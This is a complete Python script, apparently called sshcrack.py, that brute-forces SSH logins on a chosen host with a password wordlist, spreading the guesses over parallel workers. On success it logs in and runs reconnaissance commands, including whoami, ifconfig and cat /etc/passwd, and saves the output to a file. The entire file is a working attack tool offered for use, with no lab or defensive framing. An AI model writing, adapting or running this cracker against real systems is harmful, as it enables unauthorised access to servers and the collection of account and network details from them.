#!venv/bin/python

import multiprocessing
import sys
import time
from pathlib import Path
from pexpect import pxssh


NUM_WORKERS_PER_CPU = 1


def parse_args():
    try:
        account = sys.argv[1]
        wordlist = sys.argv[2]
    except IndexError:
        print("Usage: sshcrack.py USERNAME:HOST:PORT WORDLIST")
        sys.exit(1)

    user, host, port = account.split(":")
    return user, host, port, wordlist


def load_pws(wordlist):
    word_pth = Path(__file__).parent / f"{wordlist}"
    if not word_pth.exists():
        print(f"Word list '{word_pth.name}' not found")
        sys.exit(1)

    pws = []
    with word_pth.open("r") as f:
        for pw in f.read().split("\n"):
            pws.append(pw)

    return pws


def connect(user, host, port, password):
    try:
        ssh = pxssh.pxssh()
        ssh.force_password = True
        ssh.login(host, user, password, port=port)
    except pxssh.ExceptionPxssh as e:
        if e.args[0] == "password refused":
            return False, password
        else:
            raise
    else:
        ssh.logout()
        return True, password


def perform_recon(ssh):
    print("Performing recon...")
    cmds = ["uptime", "uname -a", "whoami",
            "groups", "ifconfig", "cat /etc/passwd"]
    results = []
    for cmd in cmds:
        ssh.sendline(cmd)
        ssh.prompt()
        r = ssh.before.decode("utf-8")
        results.append(r.strip("\r\n"))
    s = "\n\n".join(results)
    p = Path(__file__).parent / "recon.txt"
    p.write_text(s)


if __name__ == '__main__':
    user, host, port, wordlist = parse_args()
    pws = load_pws(wordlist)
    lenpws = len(pws)
    print(f"Loaded {lenpws} passwords from '{wordlist}'")
    w = len(str(lenpws))

    clock_start = time.time()
    nw = multiprocessing.cpu_count() * NUM_WORKERS_PER_CPU
    pool = multiprocessing.Pool(nw)

    results = []
    for pw in pws:
        args = (user, host, port, pw)
        results.append(pool.apply_async(connect, args))

    password = None
    for i, result in enumerate(results, 1):
        res, pw = result.get()
        progress = f"({i:0>{w}}/{lenpws}; {(i/lenpws)*100:0>5.2f}%)"
        if res:
            password = pw
            print(f"{progress} Password == '{pw}'")
            break
        else:
            print(f"{progress} Password != '{pw}'")

    clock_end = time.time()
    pool.terminate()
    pool.close()

    td = clock_end - clock_start
    print(f"Took {td/60:.2f} minutes to check {i}/{len(pws)} "
          f"passwords at a rate of {i/td:.2f}pw/s.")

    if password:
        ssh = pxssh.pxssh()
        ssh.force_password = True
        ssh.login(host, user, pw, port=port)
        perform_recon(ssh)
        print("Logging out.")
        ssh.logout()
